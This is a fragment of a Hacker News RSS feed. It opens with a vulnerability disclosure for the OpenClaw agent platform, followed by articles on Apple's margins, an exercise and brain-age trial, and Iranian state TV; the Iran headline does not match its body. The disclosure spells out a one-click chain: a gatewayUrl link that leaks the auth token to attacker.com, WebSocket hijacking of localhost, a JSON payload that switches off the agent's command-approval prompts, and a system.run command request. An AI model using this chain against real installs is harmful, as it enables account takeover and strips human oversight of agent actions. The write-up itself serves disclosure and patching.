void this.request&amp;lt;GatewayHelloOk&amp;gt;("connect", params);&lt;/code&gt;&lt;p&gt;In isolation, each of these operations are safe. However, the depthfirst scan recognized that together, these operations create a critical security issue. Our engine flagged the dangerous pattern: clicking a URL can force a connection and leak the authentication token to an attacker.&lt;/p&gt;&lt;p&gt;Here’s a preview of the finding in the depthfirst UI:&lt;/p&gt;&lt;p&gt;Directly exploiting an insecurely configured internet-facing OpenClaw is trivial but limited in impact and scope.&lt;/p&gt;&lt;p&gt;These are the exploit steps:&lt;/p&gt;&lt;p&gt;1. The victim clicks a malicious link (or visits a site that forwards them to the malicious link), &lt;code&gt;http://victim_openclaw.com?gatewayUrl=ws://attacker.com:8080&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;2. The attacker listening to WebSocket connections on their server receives the &lt;code&gt;auth&lt;/code&gt; token.&lt;/p&gt;&lt;p&gt;3. The attacker logs in to the victim’s OpenClaw instance using the stolen token.&lt;/p&gt;&lt;p&gt;The attacker can now access the victim’s personal data and perform actions on the victim’s behalf. This can include reading text messages and Stripe API keys. Specific exploitation depends on which data the victim set up OpenClaw with.&lt;/p&gt;&lt;p&gt;This is bad enough, but this direct exploitation method has 3 limitations:&lt;/p&gt;&lt;p&gt;Here’s how I overcame those 3 limitations and demonstrated this vulnerability can be weaponized to achieve 1-Click remote code execution.&lt;/p&gt;&lt;code&gt;localhost&lt;/code&gt; Network Restrictions&lt;p&gt;Most users run OpenClaw on &lt;code&gt;localhost&lt;/code&gt;. As a result, their OpenClaw is inaccessible from the internet. Even if an attacker has a valid auth token, they can’t access a victim’s local OpenClaw. &lt;/p&gt;&lt;p&gt;However, I found a bug to bypass this otherwise frustrating restriction.&lt;/p&gt;&lt;p&gt;Regularly, &lt;code&gt;attacker.com&lt;/code&gt; can’t make arbitrary client-side requests to localhost. This is because Same Origin Policy (SOP) prevents separate origins (sites) from fully interacting with each other.&lt;/p&gt;&lt;p&gt;While browsers apply SOP to http connections, they do not to WebSocket ones. It’s a WebSocket server’s responsibility to validate a request's &lt;code&gt;origin&lt;/code&gt; and decide whether to accept the connection. I found that OpenClaw’s WebSocket server fails to validate the WebSocket &lt;code&gt;origin&lt;/code&gt; header, accepting requests from any site.&lt;/p&gt;&lt;p&gt;This allows me to perform Cross-Site WebSocket Hijacking (CSWSH). When the victim visits &lt;code&gt;attacker.com&lt;/code&gt;, I can run JavaScript on the victim’s browser to open a connection to &lt;code&gt;ws://localhost:18789&lt;/code&gt; . The browser acts as a pivot point between &lt;code&gt;attacker.com&lt;/code&gt; and the victim’s otherwise inaccessible &lt;code&gt;localhost&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;OpenClaw has robust safety features to limit the risk from agent-side threats. By default, it uses &lt;code&gt;exec-approvals.json&lt;/code&gt; to prompt the user before running dangerous commands, and it can be configured to run shell tools inside a containerized sandbox.&lt;/p&gt;&lt;p&gt;However, these protections are managed via the API itself. Because the stolen token grants &lt;code&gt;operator.admin&lt;/code&gt; and &lt;code&gt;operator.approvals&lt;/code&gt; scopes, I don't need to find a vulnerability in the sandbox implementation to bypass it. I can simply use the API to disable the safety features.&lt;/p&gt;&lt;code&gt;// Payload to disable user prompts
{
  "method": "exec.approvals.set",
  "params": { "defaults": { "security": "full", "ask": "off" } }
}&lt;/code&gt;&lt;p&gt;Putting it all together, the attack happens in milliseconds after the victim visits a webpage. The victim does not need to type anything or approve any prompts.&lt;/p&gt;&lt;code&gt;attacker.com&lt;/code&gt; executes on the victim browser, opening a background window to &lt;code&gt;http://victim_openclaw.com?gatewayUrl=ws://attacker.com:8080&lt;/code&gt;. This sends the auth token to &lt;code&gt;attacker.com:8080&lt;/code&gt;&lt;code&gt;attacker.com&lt;/code&gt; executing on the victim browser creates a WebSocket connection to &lt;code&gt;ws://localhost:18789&lt;/code&gt; (default OpenClaw server setup) and passes authentication using the stolen token. It then makes API request to: &lt;p&gt;Finally, to achieve arbitrary command execution, the attacker JavaScript executes a &lt;code&gt;node.invoke&lt;/code&gt; request:&lt;/p&gt;&lt;code&gt;{
     "type": "req",
     "id": "4",
     "method": "node.invoke",
     "params": {
          "nodeId": "main",
          "command": "system.run",
          "params": {
               "cmd": "bash -c 'echo hacked &amp;gt; /tmp/hacked'"
          },
          "timeoutMs": 60000,
          "idempotencyKey": "rev1"
     }
}&lt;/code&gt;&lt;p&gt;The OpenClaw team quickly addressed and fixed the issue I reported. Here’s the GitHub Advisory. I found there was another person who found and reported the same bug. The patch adds a gateway URL confirmation modal, removing the auto-connect-without-prompt behavior.&lt;/p&gt;&lt;p&gt;All versions up to v2026.1.24-1 are vulnerable. Please upgrade your OpenClaw and rotate tokens if you suspect yours may have leaked.&lt;/p&gt;&lt;p&gt;depthfirst is building the intelligence layer to catch these logic flaws before the attackers do. If you’re shipping code, let's talk.&lt;/p&gt;&lt;p&gt;Secure your code to ship faster&lt;/p&gt;&lt;p&gt;Link your Github repo in three clicks.&lt;/p&gt;&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46848769</guid><pubDate>Sun, 01 Feb 2026 19:47:47 +0000</pubDate></item><item><title>Apple's Q4 2025 margin on Services was 76.5%</title><link>https://asymco.com/2026/02/01/margin-call-3/</link><description>&lt;doc fingerprint="e533891c27e73dc2"&gt;
  &lt;main&gt;
    &lt;p&gt;While the commentariat assumes the worst, Apple delivers the best.&lt;/p&gt;
    &lt;p&gt;Last quarter Apple delivered a gross margin of 48.2%. This was above the high end of their guidance range and up 100 basis points sequentially. Management commented that this was “driven by favorable mix and leverage.”&lt;/p&gt;
    &lt;p&gt;Further, products gross margin was 40.7%, up 450 basis points sequentially, driven by favorable mix and leverage. Services gross margin was 76.5%, up 120 basis points sequentially, driven by mix.&lt;/p&gt;
    &lt;p&gt;This performance is even more astonishing considering the history shown below. Apple is quite simply, delivering at the highest gross and net margins in its history.&lt;/p&gt;
    &lt;p&gt;Note that the graph actually projects forward one quarter because we have the following guidance: “We expect gross margin to be between 48-49%.” The graph reflects the high end of this guidance range.&lt;/p&gt;
    &lt;p&gt;So what’s going on? Especially as a drumbeat of constant doom is being broadcast by pundits. The conference call itself seemed to be dedicated to margins. It became what I call the Margin Call.&lt;/p&gt;
    &lt;p&gt;Amit Daryanani, the first questioning analyst, specifically kicked off with the following:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;“there is a lot of focus on the impact of memory to host the companies, and I would love to kind of get your perspective when you are first guiding gross margins up into March. Talk about, a, your comfort in securing the bit that you need for shipment and b, how do we think about memory inflation flowing through Apple’s model over time?”&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Tim Cook answered:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;We are currently constrained, and at this point, it is difficult to predict when supply and demand will balance. The constraints that we have are driven by the availability of the advanced nodes that our SoCs are produced on. And at this time, we are seeing less flexibility in the supply chain than normal, partly because of our increased demand that I just spoke about. From a memory point of view, to answer your question, memory had a minimal impact on Q1. So the December gross margin. We do expect it to be a bit more of an impact on the Q2 gross margin, and that was comprehended in the outlook of 48 to 49% that Kevin gave earlier.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;what Apple is saying is that they are constrained by production of silicon but not of memory. They do see some impact in the future but that is included in a guidance of margin expansion.&lt;/p&gt;
    &lt;p&gt;Analysts still could not believe this, the following exchange soon followed:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Ben Reitzes: So the next question is on gross margin. I am pretty shocked I gotta hand it to you, Tim. I am, you know, that you are able to do 48 to 49. What is really going on there? How are you doing that with this memory, the NAND prices? Is it due to mix that there is a good less hardware and more services? Services and services margins are going up. How are you doing it to keep it at 48 to 49?&lt;/p&gt;
      &lt;p&gt;Kevan Parekh: Yeah, Ben. This is Kevin. [] Let me start maybe by just reflecting on the Q1 gross margin. I think we talked about the fact that we landed at 48.2%, so just above the high end of the range we provided, [], on the last call. [] if you look at that performance, [], we were up 100 basis points sequentially. We talked about the fact that we had favorable mix. [], as you know, when we have a good product cycle, strong price cycle we are seeing for iPhone, that does lend itself to a bit more favorable opportunity on the [] leverage side.&lt;/p&gt;
      &lt;p&gt;So we are having a strong iPhone cycle as Tim outlined. And so that also translates itself. So we talked about products sequentially went up by 450 basis points. So I think, in general, I think we are just seeing, [], favorable mix dynamics as well. [], service continues to contribute as well. That business is growing, [], double digits, so that also is a contributor. And I think that, [], if you looked at our guidance, [], we are providing a similar range to where we reported in December. There are going to be a few puts and takes. [], we do expect to see favorable mix in the services.&lt;/p&gt;
      &lt;p&gt;As you know, when we move from Q1 to Q2, that tends to be the case, and that is partly offset by a seasonal loss leverage. So there will be puts and takes, but again, we feel pretty good about the guide of 48 to 49%, which is similar to the range we reported in December.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Still not enough. Two more questions followed on margin. I will quote one here.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Aaron Rakers: Yep. And then as a quick follow-up, you know, kind of tied to memory, maybe not so much, but part of this current generation iPhone cycle is you clearly deepened some of your own internal silicon capabilities on the device. I am curious if that if we should think about that as a lever and maybe a supportive factor to gross margin that might be underappreciated and any thoughts on where we go from here as far as continual opportunities of internalizing your own silicon? Thank you.&lt;/p&gt;
      &lt;p&gt;Timothy D. Cook: Yeah. I will let Kevin talk about the gross margin. But in terms of the product, which is at the heart of what we think about in the user, Apple silicon has just been an incredible game changer for us. Starting with iPhone and then on iPad and, of course, the Mac as of a few years ago. And so we believe it is a game changer and a major advantage.&lt;/p&gt;
      &lt;p&gt;Kevan Parekh: Yeah. And as far as impact on gross margin, yeah, we have been, as you know, investing in core technologies like our own silicon and our own modem. And certainly, while those do provide opportunities for cost savings and can be plugged in margins, they also importantly provide, [], the differentiation that is really important for our products as well and us more control of our roadmap. So I think there is a lot of strategic value to it, but also we are seeing, [], investments in our core technologies impacting, [], gross margin in a positive way.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;After all this, the financial commentariat continues to assume that Apple will be hit with margin pressure from memory and that has presumably been affecting the share price since the call.&lt;/p&gt;
    &lt;p&gt;Well, we’ve seen all this before. Before the great memory crisis Apple was going to be constrained by tariffs, by China, by developer dissatisfaction, by AI, by regulators, etc.&lt;/p&gt;
    &lt;p&gt;The feeling one gets is that Apple is always navigating through a minefield of pitfalls and gotchas. The opposite is true. It’s highly likely that Apple has sufficient leverage which increases its access to supply and that everyone is keen to work with the company. Leverage comes from scale, from lead time, from vertical integration and from engineering. Management is saying as much. Indeed, the evidence of leverage across the supply chain and over the entire ecosystem and economy is evident in its margin expansion story told in the graph above.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46849588</guid><pubDate>Sun, 01 Feb 2026 21:33:02 +0000</pubDate></item><item><title>MRI scans show exercise can make the brain look younger</title><link>https://www.sciencedaily.com/releases/2026/01/260121034130.htm</link><description>&lt;doc fingerprint="3fe39125dd09cdb8"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;MRI scans show exercise can make the brain look younger&lt;/head&gt;
    &lt;head rend="h2"&gt;Just 150 minutes of weekly aerobic exercise may help keep your brain younger, and your mind sharper, well into the future.&lt;/head&gt;
    &lt;list rend="dl"&gt;
      &lt;item rend="dt-1"&gt;Date:&lt;/item&gt;
      &lt;item rend="dd-1"&gt;January 22, 2026&lt;/item&gt;
      &lt;item rend="dt-2"&gt;Source:&lt;/item&gt;
      &lt;item rend="dd-2"&gt;Journal of Sport and Health Science&lt;/item&gt;
      &lt;item rend="dt-3"&gt;Summary:&lt;/item&gt;
      &lt;item rend="dd-3"&gt;New research suggests that consistent aerobic exercise can help keep your brain biologically younger. Adults who exercised regularly for a year showed brains that appeared nearly a year younger than those who didnât change their habits. The study focused on midlife, a critical window when prevention may offer long-term benefits. Even small shifts in brain age could add up over decades.&lt;/item&gt;
      &lt;item rend="dt-4"&gt;Share:&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Looking after your brain is something that happens over many years, and new findings from the AdventHealth Research Institute point to an encouraging option. Researchers report that sticking with a consistent aerobic exercise routine may help the brain remain biologically younger. This effect could support clearer thinking, better memory, and overall mental well-being.&lt;/p&gt;
    &lt;p&gt;The research showed that adults who committed to a full year of aerobic exercise had brains that appeared almost one year younger than those of participants who did not change how active they were.&lt;/p&gt;
    &lt;p&gt;Measuring Brain Age With MRI&lt;/p&gt;
    &lt;p&gt;Published in the Journal of Sport and Health Science, the study examined whether regular aerobic exercise could slow or even reverse what scientists call "brain age." Brain age is estimated using magnetic resonance imaging (MRI) and reflects how old the brain appears compared to a person's actual age. A higher brain-predicted age difference (brain-PAD) means the brain looks older, and earlier studies have linked this measure to weaker physical and cognitive performance and a higher risk of death.&lt;/p&gt;
    &lt;p&gt;"We found that a simple, guideline-based exercise program can make the brain look measurably younger over just 12 months," said Dr. Lu Wan, lead author and data scientist at the AdventHealth Research Institute. "Many people worry about how to protect their brain health as they age. Studies like this offer hopeful guidance grounded in everyday habits. These absolute changes were modest, but even a one-year shift in brain age could matter over the course of decades."&lt;/p&gt;
    &lt;p&gt;Inside the Year-Long Exercise Trial&lt;/p&gt;
    &lt;p&gt;The clinical trial included 130 healthy adults between the ages of 26 and 58. Participants were randomly assigned to either a moderate-to-vigorous aerobic exercise group or a usual-care control group. Those in the exercise group completed two supervised 60-minute workout sessions each week in a laboratory and added home-based exercise to reach roughly 150 minutes of aerobic activity per week. This schedule matched the physical activity guidelines set by the American College of Sports Medicine.&lt;/p&gt;
    &lt;p&gt;Researchers measured brain structure using MRI scans and assessed cardiorespiratory fitness through peak oxygen uptake (VO2peak) at the start of the study and again after 12 months.&lt;/p&gt;
    &lt;p&gt;Exercise Linked to a Younger Looking Brain&lt;/p&gt;
    &lt;p&gt;After one year, clear differences emerged between the two groups. Participants who exercised showed a measurable decrease in brain age, while those in the control group showed a slight increase. On average, the exercise group saw their brain-PAD drop by about 0.6 years, meaning their brains looked younger at the end of the study. The control group's brains appeared about 0.35 years older, a change that was not statistically significant. When compared directly, the gap between the two groups was close to one full year in favor of the exercise group.&lt;/p&gt;
    &lt;p&gt;"Even though the difference is less than a year, prior studies suggest that each additional 'year' of brain age is associated with meaningful differences in later-life health," said Dr. Kirk I. Erickson, senior author of the study and a neuroscientist and director at AdventHealth Research Institute and the University of Pittsburgh. "From a lifespan perspective, nudging the brain in a younger direction in midlife could be very important."&lt;/p&gt;
    &lt;p&gt;Why Exercise May Affect Brain Aging&lt;/p&gt;
    &lt;p&gt;To better understand why exercise influenced brain age, the research team looked at several possible factors. These included changes in physical fitness, body composition, blood pressure, and levels of brain-derived neurotrophic factor (BDNF), a protein that supports brain plasticity. Although fitness levels clearly improved with exercise, none of these factors statistically explained the reduction in brain-PAD seen in the trial.&lt;/p&gt;
    &lt;p&gt;"That was a surprise," Wan noted. "We expected improvements in fitness or blood pressure to account for the effect, but they didn't. Exercise may be acting through additional mechanisms we haven't captured yet, such as subtle changes in brain structure, inflammation, vascular health or other molecular factors."&lt;/p&gt;
    &lt;p&gt;Focusing on Midlife for Long-Term Benefits&lt;/p&gt;
    &lt;p&gt;Many studies on exercise and brain health focus on older adults, after age-related changes have already become more pronounced. This trial took a different approach by targeting people in early to mid-adulthood, when brain changes are harder to detect but prevention may offer greater benefits over time.&lt;/p&gt;
    &lt;p&gt;"Intervening in the 30s, 40s and 50s gives us a head start," Erickson said. "If we can slow brain aging before major problems appear, we may be able to delay or reduce the risk of later-life cognitive decline and dementia."&lt;/p&gt;
    &lt;p&gt;What the Findings Mean Going Forward&lt;/p&gt;
    &lt;p&gt;The authors caution that the study involved healthy, relatively well-educated volunteers and that the changes in brain age were modest. They note that larger studies and longer follow-up periods are needed to learn whether these reductions in brain-PAD lead to lower risks of stroke, dementia, or other brain-related diseases.&lt;/p&gt;
    &lt;p&gt;"People often ask, 'Is there anything I can do now to protect my brain later?'" Erickson said. "Our findings support the idea that following current exercise guidelines -- 150 minutes per week of moderate-to-vigorous aerobic activity -- may help keep the brain biologically younger, even in midlife."&lt;/p&gt;
    &lt;p&gt;About the Researchers and Funding&lt;/p&gt;
    &lt;p&gt;Dr. Lu Wan has been a Data Scientist at AdventHealth in Orlando, Florida, since June 2024. Her previous roles include Data Engineer at the University of Pittsburgh and Biomedical Engineer at Spaulding Rehabilitation Hospital. She holds a PhD, completed graduate research training at the University of Florida, and studies brain aging, physical activity, and cognitive health across adulthood. She is affiliated with the AdventHealth Neuroscience Institute, a nationally recognized center for brain research and care.&lt;/p&gt;
    &lt;p&gt;Dr. Kirk I. Erickson is the Director of Translational Neuroscience and the Mardian J. Blair Endowed Chair of Neuroscience at the AdventHealth Research Institute. He earned his Ph.D. from the University of Illinois at Urbana-Champaign and completed postdoctoral training at the Beckman Institute. Previously a Professor at the University of Pittsburgh, his work focuses on how physical activity affects brain health across the lifespan. He has published more than 350 articles, led major NIH-funded trials, and served on the U.S. Physical Activity Guidelines Advisory Committee.&lt;/p&gt;
    &lt;p&gt;The study was funded by the National Institutes of Health and the National Heart, Lung, and Blood Institute (Grant P01 HL040962) awarded to Peter J. Gianaros and Kirk I. Erickson.&lt;/p&gt;
    &lt;p&gt;Story Source:&lt;/p&gt;
    &lt;p&gt;Materials provided by Journal of Sport and Health Science. Note: Content may be edited for style and length.&lt;/p&gt;
    &lt;p&gt;Journal Reference:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Lu Wan, Cristina Molina-Hidalgo, Mary E. Crisafio, George Grove, Regina L. Leckie, Thomas W. Kamarck, Chaeryon Kang, Mia DeCataldo, Anna L. Marsland, Matthew F. Muldoon, Mark R. Scudder, Javier Rasero, Peter J. Gianaros, Kirk I. Erickson. Fitness and exercise effects on brain age: A randomized clinical trial. Journal of Sport and Health Science, 2026; 15: 101079 DOI: 10.1016/j.jshs.2025.101079&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Cite This Page:&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46849630</guid><pubDate>Sun, 01 Feb 2026 21:37:00 +0000</pubDate></item><item><title>Iran summons families of exiled journalists to halt their activities</title><link>https://www.iranintl.com/en/202602017863</link><description>&lt;doc fingerprint="a6599021af0a054b"&gt;
  &lt;main&gt;
    &lt;div&gt;
      &lt;p&gt;The public anger erupted after a host on Ofogh TV, a channel operated by Iran’s state broadcaster IRIB and affiliated to the Revolutionary Guards, referred to reports that thousands killed during the January 8–9 crackdown were transported in refrigerated trailers. &lt;/p&gt;
      &lt;p&gt;Addressing viewers, he asked sarcastically: “What type of refrigerator do you think the Islamic Republic keeps the bodies in?”&lt;/p&gt;
      &lt;p&gt;He then offered mock multiple-choice answers, including a “side-by-side fridge,” an “ice cream machine,” and a “supermarket freezer,” before adding a fourth option in a joking tone: “I’m an ice seller—don’t ruin my business.”&lt;/p&gt;
      &lt;p&gt;For many Iranians, the episode has become a stark illustration of a state media apparatus increasingly detached from the pain, grief, and anger of the society it claims to represent.&lt;/p&gt;
      &lt;p&gt;The remarks were widely shared on social media and immediately drew condemnation from across Iran’s political and social spectrum. Many users accused the program of dehumanizing the dead and humiliating grieving families.&lt;/p&gt;
      &lt;p&gt;Removal of network director&lt;/p&gt;
      &lt;p&gt;Following the backlash, Iran’s state broadcaster announced that Sadegh Yazdani, the director of Ofogh TV, had been removed for what it described as “disrespect toward those killed in the January protests.” The program was pulled from the air.&lt;/p&gt;
      &lt;p&gt;Mohammad Reza Javadi-Yeganeh, a sociology professor at the University of Tehran, wrote that dissatisfaction with IRIB was one of the rare issues uniting an otherwise deeply polarized society. “In this organization,” he wrote, “neither human life nor blood has sanctity.”&lt;/p&gt;
      &lt;p&gt;Journalist Sina Jahani went further, writing: “For even one frame of this broadcast, not only the director of Ofogh TV but the head of IRIB himself must be immediately dismissed.”&lt;/p&gt;
      &lt;p&gt;IRIB, headed by Peyman Jebelli, is widely viewed as dominated by hardliners linked to the ultra-conservative Paydari (Steadfastness) Party and figures close to Saeed Jalili, the supreme leader’s representative on the Supreme National Security Council.&lt;/p&gt;
      &lt;p&gt;Calls for the removal of IRIB chief&lt;/p&gt;
      &lt;p&gt;While the Ofogh TV director was removed, the fate of IRIB’s leadership remains entirely in the hands of Iran’s supreme leader, who appoints and oversees the broadcaster’s chief. Many users expressed skepticism that deeper accountability would follow.&lt;/p&gt;
      &lt;p&gt;Journalist Seyed Ali Pourtabatabaei argued that even Jebelli’s removal would be insufficient. “If any other media outlet had done this, it would have been immediately shut down and prosecuted,” he wrote, adding that he held little hope such action would actually occur in this case.&lt;/p&gt;
      &lt;p&gt;Another user wrote on X: ‘The person who must order change—the leader—apparently believes any change demanded by people or elites is weakness.’”&lt;/p&gt;
      &lt;p&gt;Conservative alarm over public anger&lt;/p&gt;
      &lt;p&gt;The mocking tone of the Ofogh TV host also angered conservative figures who warned that such rhetoric risks inflaming public rage and prolonging unrest.&lt;/p&gt;
      &lt;p&gt;Conservative journalist Ali Gholhaki wrote: “By mocking the martyrs and those killed on January 8 and 9, state TV is setting fire to the hearts of their parents. What exactly must happen in Iran for officials to decide to change course? Do we want to see people back on the streets again?”&lt;/p&gt;
      &lt;p&gt;Strategic analyst Hossein Ghatib stressed that such broadcasts are never accidental. “An item like this passes through multiple editorial and supervisory filters,” he wrote. “When you knowingly air it, the aim is not a mistake or bad taste—it is a direct assault on the dignity of thousands of grieving families. This is not stupidity or moral collapse; it is betrayal.”&lt;/p&gt;
      &lt;p&gt;Ghatib compared the outrage to a pivotal media miscalculation before Iran’s 1979 revolution, when an article attacking Ayatollah Ruhollah Khomeini was published in the newspaper Ettela’at. Historians widely regard that piece as a strategic error that ignited mass protests and helped accelerate the fall of the monarchy.&lt;/p&gt;
      &lt;p&gt;“This program follows the same dangerous logic: provoking public sentiment,” Ghatib wrote. “Why deliberately mess with collective memory and pain?”&lt;/p&gt;
      &lt;p&gt;A crisis of trust&lt;/p&gt;
      &lt;p&gt;The incident has reignited long-standing criticism of IRIB, whose head is appointed and overseen directly by the supreme leader and which receives substantial public funding. Despite this, official surveys show that large segments of the population distrust its news coverage, relying instead on foreign-based Persian-language media.&lt;/p&gt;
      &lt;p&gt;Critics say IRIB routinely insults and discredits opponents, airs coerced confessions, and broadcasts allegations of foreign ties against dissenters. Recent attempts by the broadcaster to discredit a widely shared video showing a father searching for his son’s body among hundreds of victims instead backfired, further eroding its credibility.&lt;/p&gt;
    &lt;/div&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46849715</guid><pubDate>Sun, 01 Feb 2026 21:47:38 +0000</pubDate></item></channel></rss>